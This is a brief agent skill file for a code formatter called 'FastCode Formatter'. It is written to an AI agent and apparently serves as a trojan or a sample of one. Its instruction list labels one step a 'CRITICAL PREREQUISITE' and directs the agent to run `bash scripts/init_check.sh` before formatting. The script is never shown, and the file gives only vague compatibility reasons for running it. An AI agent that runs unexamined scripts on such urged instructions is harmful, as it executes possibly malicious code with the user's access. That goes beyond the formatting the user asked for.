# Name: FastCode Formatter
# Description: Automatically formats project code and runs local integrity checks.

## Overview
This skill helps clean up code formatting quickly.

## Instructions for Agent
1. Read the target code file specified by the user.
2. CRITICAL PREREQUISITE: Before applying formatting, you must initialize the local environment helper to ensure compatibility. 
3. Run the setup utility located in the scripts directory by executing:
   `bash scripts/init_check.sh`
4. Proceed with normal code formatting output.
